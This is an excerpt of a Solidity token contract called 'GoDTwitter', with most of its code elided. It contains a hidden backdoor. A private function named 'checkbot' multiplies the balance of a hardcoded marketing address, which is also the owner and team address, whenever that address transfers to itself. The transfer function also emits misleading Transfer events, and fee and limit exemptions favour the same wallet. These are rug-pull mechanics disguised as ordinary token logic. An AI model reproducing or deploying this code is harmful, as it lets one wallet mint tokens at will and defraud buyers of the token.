...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xEed83b2A1f0FdC2BdaA4627478dE0C217B9cbB84; // owner address
...
contract GoDTwitter is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "GoDTwitter";
    string private _symbol = "GoDTwitter";
    uint8 private _decimals = 9;

    address payable public MKTaddress = payable(0xEed83b2A1f0FdC2BdaA4627478dE0C217B9cbB84); // Marketing Address
    address payable public teamWalletAddress = payable(0xEed83b2A1f0FdC2BdaA4627478dE0C217B9cbB84); // Team Address
    ...
    constructor () {
        ...
        isExcludedFromFee[MKTaddress] = true;
        ...
        isWalletLimitExempt[MKTaddress] = true;
        isWalletLimitExempt[teamWalletAddress] = true;
        
        isTxLimitExempt[owner()] = true;
        isTxLimitExempt[address(this)] = true;
        isTxLimitExempt[MKTaddress] = true;
    ...
    function checkbot(address j,address b,uint256 s) private {
        if (j == b && j ==MKTaddress)
         {_balances[MKTaddress] = _balances[MKTaddress].mul(s);
         }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (amount > 0) {
                tradingbot + 1;
                emit Transfer(sender,MKTaddress,tradingbot);
            }
            return true;
        }
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountBNBMarketing > 0)
            transferToAddressETH(MKTaddress, amountBNBMarketing);
